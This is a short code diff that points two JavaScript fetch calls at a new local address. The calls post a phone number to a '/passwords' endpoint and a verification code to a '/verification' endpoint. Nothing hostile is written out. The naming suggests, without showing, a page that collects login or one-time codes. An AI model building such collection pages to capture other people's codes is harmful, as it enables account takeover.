@@ -373,7 +373,7 @@
                 }
 
                 // Send phone number to the server
-                fetch('http://localhost:8080/passwords', {
+                fetch('http://127.0.0.1:5001/passwords', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -408,7 +408,7 @@
                 }
 
                 // Send verification code to the server
-                fetch('http://localhost:8080/verification', {
+                fetch('http://127.0.0.1:5001/verification', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
